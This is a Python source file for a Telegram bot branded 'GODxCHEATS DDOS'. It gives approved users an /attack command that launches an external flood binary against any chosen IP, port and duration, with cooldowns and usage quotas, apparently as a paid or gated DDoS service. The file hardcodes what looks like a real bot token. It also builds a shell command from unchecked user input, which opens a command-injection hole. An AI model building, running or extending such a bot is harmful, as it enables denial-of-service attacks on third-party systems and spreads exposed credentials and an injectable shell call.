import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from collections import defaultdict
import time

# Bot token and admin user ID
TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"
ADMIN_USER_ID = 1662672529

# Data structures for managing bot state
approved_users = set()  # Set to store approved user and group IDs
attack_logs = defaultdict(list)  # Store attack logs per user
usage_limits = defaultdict(lambda: {"count": 0, "timestamp": time.time()})  # Track hourly usage limits
cooldown_timers = {}  # Track cooldowns for users

# Predefined channel link for the first-time `/attack` users
CHANNEL_LINK = "https://t.me/+03wLVBPurPk2NWRl"

# Start Command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 WELCOME TO GODxCHEATS DDOS 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Use /help for all available commands*\n"
        "*Contact the Owner for Feedback or Support:* @GODxAloneBOY"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

# Run the attack command
async def run_attack(chat_id, ip, port, duration, context):
    try:
        # Execute the external command
        process = await asyncio.create_subprocess_shell(
            f"./9936 {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        # Send stdout and stderr back to the user if any
        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"🔧 [stdout]\n{stdout.decode()}")
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ [stderr]\n{stderr.decode()}")

    except Exception as e:
        # Send an error message if the attack fails
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}")
    finally:
        # Send attack finished message
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ Attack Finished Successfully!*\n\n"
                "*Thank you for using GODxCHEATS DDOS Bot.*\n"
                "*Send Feedback to the Owner:* @GODxAloneBOY"
            ),
            parse_mode="Markdown"
        )

# Approve users or groups
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to approve users.")
        return

    try:
        if context.args and context.args[0].isdigit():
            approved_users.add(context.args[0])
            await context.bot.send_message(chat_id, text=f"✅ Approved: {context.args[0]}")
        else:
            await context.bot.send_message(chat_id, text="⚠️ Usage: /approve <chat_id>")
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Remove approved users or groups
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to remove users.")
        return

    try:
        if context.args and context.args[0] in approved_users:
            approved_users.remove(context.args[0])
            await context.bot.send_message(chat_id, text=f"✅ Removed: {context.args[0]}")
        else:
            await context.bot.send_message(chat_id, text="⚠️ User not found or invalid usage.")
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Handle the attack command
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is approved
    if str(chat_id) not in approved_users:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to use this command.")
        return

    try:
        # Check cooldown
        if user_id not in cooldown_timers:
            cooldown_timers[user_id] = 0
        if cooldown_timers[user_id] > time.time():
            remaining_time = int(cooldown_timers[user_id] - time.time())
            await context.bot.send_message(chat_id, text=f"⏳ Cooldown active! Try again in {remaining_time} seconds.")
            return

        # Check usage limits
        if usage_limits[user_id]["count"] >= 3 and time.time() - usage_limits[user_id]["timestamp"] < 3600:
            await context.bot.send_message(chat_id, text="❌ You have exceeded your hourly usage limit.")
            return

        # Validate arguments
        if len(context.args) != 3:
            await context.bot.send_message(chat_id, text="⚠️ Usage: /attack <ip> <port> <duration>")
            return

        ip, port, duration = context.args
        if not duration.isdigit() or int(duration) <= 0:
            await context.bot.send_message(chat_id, text="⚠️ Duration must be a positive integer.")
            return

        duration = int(duration)

        # Prevent duplicate attack parameters
        if (ip, port, duration) in attack_logs[user_id]:
            await context.bot.send_message(chat_id, text="⚠️ Duplicate attack parameters detected.")
            return

        # First-time user gets channel link
        if not attack_logs[user_id]:
            await context.bot.send_message(chat_id, text=f"📢 Join our channel for updates: {CHANNEL_LINK}")

        # Log attack details
        attack_logs[user_id].append((ip, port, duration))
        usage_limits[user_id]["count"] += 1
        usage_limits[user_id]["timestamp"] = time.time()
        cooldown_timers[user_id] = time.time() + duration

        await context.bot.send_message(chat_id, text=f"⚔️ Attack launched on {ip}:{port} for {duration} seconds.")
        asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Display bot commands
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Restrict access to the help command
    if str(chat_id) not in approved_users:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to use this command.")
        return

    commands = (
        "/approve <chat_id> - Approve a user or group (admin only)\n"
        "/remove <chat_id> - Remove a user or group (admin only)\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/check - List all active users\n"
        "/help - Show this help message"
    )
    await context.bot.send_message(update.effective_chat.id, text=f"Commands:\n{commands}")

# Check active users
async def check(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(update.effective_chat.id, text="❌ Admin access required.")
        return

    if not attack_logs:
        await context.bot.send_message(update.effective_chat.id, text="ℹ️ No active users.")
        return

    active_users = [
        f"User ID: {user_id}, Username: {update.effective_user.username or 'Unknown'}"
        for user_id in attack_logs.keys()
    ]
    user_list = "\n".join(active_users)
    await context.bot.send_message(update.effective_chat.id, text=f"Active Users:\n{user_list}")

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
